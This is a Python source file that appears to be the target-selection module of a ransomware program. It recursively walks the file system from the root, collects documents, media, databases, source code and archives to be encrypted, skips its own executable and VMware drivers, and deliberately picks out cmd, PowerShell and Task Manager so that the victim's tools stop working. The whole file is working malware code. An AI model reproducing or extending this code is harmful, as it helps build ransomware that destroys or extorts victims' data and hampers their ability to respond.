#!/usr/bin/env python
import os



def discoverFiles(startpath):
    '''
    Walk the path recursively down from startpath, and perform method on matching files.

    :startpath: a directory (preferably absolute) from which to start recursing down.
    :yield: a generator of filenames matching the conditions

    Notes:
        - no error checking is done. It is assumed the current user has rwx on
          every file and directory from the startpath down.

        - state is not kept. If this functions raises an Exception at any point,
          There is no way of knowing where to continue from.
    '''

    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.

    # not using this because I want to crypt all the things
    extensions = [
         'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps1', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
    ]

    SPECIAL_FILES = ['cmd', 'powershell', 'Taskmgr']

    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            # don't want to crypt the malware itself
            if 'main.exe' in absolute_path:
                continue
            # don't want to crypt VMWare drivers
            if 'VMware' in absolute_path:
                continue
            # don't want to crypt system files. Need the OS to still work
            if 'Windows' not in absolute_path:
                print(absolute_path)
                yield absolute_path
            else:
                # but it would be nice if somethings didn't work
                for f in SPECIAL_FILES:
                    if f in absolute_path:
                        yield absolute_path


if __name__ == "__main__":
    x = discoverFiles('/')
    for i in x:
        print(i)
